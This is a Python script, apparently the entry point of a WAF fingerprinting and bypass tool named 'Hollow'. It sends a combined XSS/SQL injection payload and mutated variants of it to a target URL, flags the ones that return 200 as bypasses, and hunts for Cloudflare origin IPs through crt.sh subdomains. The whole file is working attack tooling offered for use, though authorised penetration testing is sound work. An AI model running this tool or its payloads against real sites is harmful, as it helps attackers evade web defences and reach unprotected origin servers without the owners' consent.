import argparse
import sys
import requests
try:
    from colorama import init, Fore
    init(autoreset=True)
except ImportError:
    sys.exit("Please install requirements: pip install requests colorama")

from core.fingerprint import detect_waf, find_origin_ip
from core.bypass import suggest_bypass, generate_mutations

def main():
    parser = argparse.ArgumentParser(description="Hollow - WAF Fingerprinting & Bypass Profiler")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument("--mutate", action="store_true", help="Attempt automated payload mutations to bypass WAF")
    args = parser.parse_args()

    target = args.target
    if not target.startswith("http"):
        target = "https://" + target

    print(f"{Fore.CYAN}[*] Scanning target: {target}")
    print(f"{Fore.CYAN}[*] Probing for WAF signatures...\n")

    result = detect_waf(target)

    if "error" in result:
        print(f"{Fore.RED}[!] Error connecting to target: {result['error']}")
        sys.exit(1)

    if result["waf_detected"]:
        print(f"{Fore.YELLOW}[+] WAF Detected: {Fore.WHITE}{result['waf_detected'].upper()}")
    else:
        print(f"{Fore.GREEN}[+] No obvious WAF detected.")

    if result["blocked"]:
        print(f"{Fore.RED}[!] Attack payload was BLOCKED (Status: {result['attack_status']})")
    else:
        print(f"{Fore.GREEN}[+] Attack payload passed through (Status: {result['attack_status']})")

    # --- MUTATION LOGIC ---
    if args.mutate and result["blocked"]:
        print(f"\n{Fore.CYAN}[*] --mutate flag detected. Generating payload mutations...")
        original_payload = "<script>alert(1)</script>' OR 1=1 --"
        mutations = generate_mutations(original_payload)
        
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        
        for name, mutated_payload in mutations.items():
            test_url = f"{target}?test={mutated_payload}"
            try:
                response = requests.get(test_url, headers=headers, timeout=5)
                if response.status_code == 200:
                    print(f"    {Fore.GREEN}[BYPASS!] {name} worked! Status: 200 OK")
                else:
                    print(f"    {Fore.RED}[-] {name} failed. Status: {response.status_code}")
            except requests.exceptions.RequestException:
                print(f"    {Fore.RED}[-] {name} failed (Connection Error)")
    # -------------------------

    # --- ORIGIN IP HUNTING LOGIC ---
    if result["waf_detected"] == "cloudflare":
        domain = target.replace("https://", "").replace("http://", "").split("/")[0]
        print(f"\n{Fore.CYAN}[*] Cloudflare detected. Attempting to find Origin IPs for {domain}...")
        subdomains = find_origin_ip(domain)
        if subdomains:
            print(f"    {Fore.GREEN}[+] Potential bypass subdomains found (check if they resolve to non-Cloudflare IPs):")
            for sub in subdomains:
                print(f"        -> {sub}")
        else:
            print(f"    {Fore.RED}[-] No subdomains found via crt.sh.")
    # -------------------------------

    print(f"\n{Fore.CYAN}[*] Suggested Bypass Strategies:")
    strategies = suggest_bypass(result["waf_detected"], result["blocked"])
    for strat in strategies:
        print(f"    {Fore.MAGENTA}->{Fore.WHITE} {strat}")

if __name__ == "__main__":
    main()
